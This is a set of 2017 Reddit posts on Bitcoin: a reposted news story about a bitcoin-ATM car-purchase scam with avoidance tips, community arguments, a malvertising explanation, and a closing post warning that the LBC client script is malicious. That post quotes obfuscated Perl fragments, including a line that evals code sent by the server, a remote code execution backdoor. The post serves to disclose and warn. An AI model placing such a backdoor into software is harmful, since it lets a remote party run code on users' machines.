	<TITLE> Maryland Man Loses $4,400 in Bitcoin Trying to Buy 55 Chevy Online </TITLE>
	<DATE> 2017-05-09 06:45:23 </DATE>
	<INFO> reddit post </INFO>
	<TEXT> http://www.nbcwashington.com/news/local/Maryland-Man-Loses-4400-in-Bitcoin-Trying-to-Buy-55-Chevy-Online-421676383.html

When a Maryland man finally found the dream car he could afford online, he got taken for a ride.

Jerome Harrells first car was a 1955 Chevrolet, and years later, he wanted another one. He searched 55 Chevy online and found a lot of them, but most of them were too expensive for him, he said.

Then the Vietname veteran saw one for $3,000.

I jumped on it because I figured you can't get one for $3,000 nowhere else, Harrell said. So I jumped on it and everything went just fine.

He said everything looked legitimate. The seller told him she got the car in a divorce settlement, which was why she was selling it at a bargain.

She told him the car would be delivered from West Virginia after he paid using Google Wallet, a service that allows payments to made digitally.

Then he got what looked to him like an official invoice that instructed him to pay using a bitcoin ATM, a machine that allows the exchange of cash and bitcoins, the uninsured digital currency created and exchanged anonymously and independent of banks or governments.

Never heard it before or anything, but we went on the computer and looked at it and it says it's in Wal-mart, so I figured it had to be legit, Harrell said.

He sent a total of $4,400 to the seller and was told the car would arrive in three days.

I couldn't even hardly sleep that night because I was excited because the car is going to get here, he said.

He watched out the window for the delivery all day, but as the hours went by, he realized hed been scammed.

He emailed the seller, but she didnt reply.

Google Wallet told him they dont use bitcoin and confirmed hed been scammed.

To prevent becoming a victim of such a scam, here are four things to know:

Be wary of any "too good to be true" deals.

Make sure you know with whom you are dealing. If the seller only wants to communicate through email, that's a big red flag.

Scrutinize every message you receive. Scammers work hard to make their emails look official. The one Harrell received had the Google Wallet logo and even came from an email address that looked legitimate at first glance.

Finally, when making large purchases online, think twice about using bitcoin. Treat the digital currency as cash.

Harrell said he learned an expensive and heartbreaking lesson, and he gave up on the search for another 55 Chevy. </TEXT>

	<TEXT> Yes, it's a risk.

 If it is a risk, what do merchants do to prevent it?

I think a lot of the bigger merchants and service providers have algorithms they run to determine how much of a risk there is and how they should behave based on that. I especially remember ShapeShift talking about this. Probably some sort of aggregate based statistical analysis. I imagine the value of the transaction itself plays a pretty huge role in this.

Anyone is also free to create a Child-Pays-For-Parent transaction from a currently unconfirmed UTXO that they control. Again, this could be especially useful for high value transactions.

/u/evoorhees, /u/bdarmstrong, or others, any input on this without giving too much away? </TEXT>

	<TEXT> Never explicitly 'dumb', but when I first joined Reddit it was usually more of a condescending implication that I'm some sort of plebe incapable of understanding any sort of in depth explanation. I'm definitely not a computer science wizard, but I have a pretty solid IT background and have been fanatically following the goings-on of Bitcoin for 5+ years now, and like to think I can at least somewhat comprehend explanations from those more technically competent than I.

That's also not speaking to other *less favorable* interactions I have sometimes seen with others.

To be perfectly fair, I've abandoned any attempts at sincere conversation lately in favor of insults, and for that I sincerely apologize again. I've considered making genuine attempts at conversation, but then I have this thought in my head that it's a waste of time as I believe I probably won't receive a genuine response. My train of thought recently has been to fight perceived toxicity with more toxicity, which I've recently reconsidered as probably a shitty thing to be doing.

Fair enough on the long days. </TEXT>

	<TEXT> Please accept my 99 more apologies. I post them as sincerely as I can.

I just really don't understand your behavior. And hey, nobody has to justify themselves to an anonymous internet stranger, but I'm sure I'm not the only one baffled by the behavior of the CTO of a major company.

Why should I take the time to attempt to have a genuine conversation when I'm just going to be told that I'm dumb or don't understand, or will receive an insult or no response? I've sincerely attempted in the past, and it seems like one of the above outcomes always results.

On a higher level, why is the CTO of a major company even spending significant portions of his day arguing with people on Reddit?

I just don't get it. I'm not trying to be confrontational here, and sincerely appreciate you taking the time to have an actual conversation. </TEXT>

[LocalBitcoins](https://localbitcoins.com/) or [Mycelium Local Trader](https://mycelium.com/lt/help.html) are easiest for in-person cash transactions.

	<TEXT> Thank you for elaborating upon that and breaking it down!

I think I'm understanding what you're saying now.

I think we're on the same page on all those points, like you said, except the last.

On the last point

 * Ethereum is Bitcoin now and we should all buy it. Everyone here ag... Wait what!?

well, he doesn't explicit say that, but I think it's somewhat reasonable to assume that it's implied based on the subreddit it was posted in.  However, strictly interpreted, this could really apply to absolutely any cryptocurrency, not just Bitcoin or Ethereum. Sure, maybe Nooku was only talking about Ethereum and maybe it's a bunch of shilling, but I think the post also serves as a stark reminder that the same level of shenanigans and toxicity can potentially happen with Ethereum (or any cryptocurrency) if it experiences the same level of success as Bitcoin. </TEXT>

I am talking about the content of the post, not the reputation or possible intent of the person that made the post. I apologize if providing attribution has caused confusion or controversy.

I don't say that to be snarky.

I think there are some very serious issues with Bitcoin right now, and [this](https://coinmarketcap.com/charts/#btc-percentage) is very likely a direct reflection of those issues.

Would it be accurate to say that our points are as follows?

* /u/tophernator: Nooku has a poor reputation and wants Bitcoin to fail and this post in /r/btc is spreading his propaganda.
* /u/subject1230: The content of the linked post, regardless of author, raises some extremely valid points. </TEXT>

	<TEXT>  The idea will live on regardless, this is correct. But if Bitcoin fails it would be a huge setback for all cryptocurrencies, simply because it will show they are not a solid store of value. It would mean you have to switch to a new coin every few years, or constantly rebalance between multiple coins.

I suspect, but cannot prove, that this is the true goal of Blockstream. </TEXT>

It's basically backed by [Proof-of-Work](https://en.wikipedia.org/wiki/Proof-of-work_system) and security/immutability provided by Bitcoin miners (see number 7 [here](https://www.bitcoin.com/faq)).

What gives it it's worth?

[Market supply and demand](https://coinmarketcap.com/currencies/bitcoin/#markets).

That's all extremely simplified of course. There's some good resources at https://www.bitcoin.com/faq and lots of other places for further reading. </TEXT>

	<TEXT> Ads are also a great way to pick up malware.

[Malvertising (a portmanteau of "malicious advertising") is the use of online advertising to spread malware.[1]](https://en.wikipedia.org/wiki/Malvertising)

Malvertising involves injecting malicious or malware-laden advertisements into legitimate online advertising networks and webpages.[2] Online advertisements provide a solid platform for spreading malware because significant effort is put into them in order to attract users and sell or advertise the product.[3] Because advertising content can be inserted into high-profile and reputable websites, malvertising provides malefactors an opportunity to push their attacks to web users who might not otherwise see the ads, due to firewalls, more safety precautions, or the like.[4][5] Malvertising is "attractive to attackers because they 'can be easily spread across a large number of legitimate websites without directly compromising those websites'."[6] </TEXT>

[This](https://www.reddit.com/r/btc/comments/67gld1/coming_soon_to_poolbitcoincom_already_the_highest/dgq8lkh/?context=1) seems like a pretty solid explanation, though I cannot say for sure as I am not a part of the operation myself.

	<TEXT> **IT IS ACTUALLY MALICIOUS, DON'T RUN IT!**


EDIT: I was originally going to retract that message, as the code seemed safe, but there's an **actual** backdoor allowing **remote code execution**! (see below).

You are probably thinking that I am one of the people who are thinking that LBC significantly undermines the safety of Bitcoin. No, I am not. I just discovered something very weird when running the executable, which seems to suggest of its malicious behavior.

When I ran the original script after reading the documentation, it constantly returned an error from the server and didn't run.

    sopa@pc:~/LBC $ ./LBC
    Will use 2 CPUs.
    Ask for work... Server doesn't like us. Answer: wrong secret.

It told me that the secret was wrong so I edited the script to print it out and that's where the shady stuff starts.

    sopa@pc:~/LBC $ ./LBC-modified
    Will use 2 CPUs.
    Ask for work... Server doesn't like us. Answer: malformed request.

Huh, a malformed request now?! Let's run it again.

    sopa@pc:~/LBC $ ./LBC-modified
    Will use 2 CPUs.
    Ask for work... Server doesn't like us. Answer: challenge failed.

I ran it multiple times and the error message was always different and it seemed like they were randomly picked from a list.

I thought that this is very strange, as the original script returned the same error all the time, when I discovered these lines in the LBC script:

    local
    (
    $/,
    *FILE
    )
    ;
    open
    FILE,
    $file;
    my $codeprint
    =
    md5_hex(
    FILE
    )
    ;
    close
    FILE;

    return
    $codeprint;
    }

Notice the code style of this perl script. Seems like it was obfuscated (or just compacted so that it does not take a lot of disk space, which is not that bad).

What this piece of code does is taking an MD5 hash of the entire file. It then proceeds to submit that hash to the server with every request. This seems to verify that the file wasn't tampered with.
There's also a death_kiss routine which prints "DEATH KISS" and exits. I have no idea what it's for, though.

There's over six thousand lines in this script and nobody really knows what do they actually do.

I request u/therico666 to explain the above and to publish the unobfuscated source code of the script.

Do not run the client executable on any important computers, it might contain a rootkit. Unless the author of the scripts explains the purpose of these functions, I don't recommend trusting it.

EDIT: corrected the username: rico666 - therico666.


**REMOTE CODE EXECUTION BACKDOOR**

As noted by u/_jstanley, there's a line to evaluate the server's reply. Basically, this is remote code execution.

    if
    (
    defined
    $answer
    -
    {eval}
    )
    {
    eval
    $answer
    -
    {eval}
    ;
    }
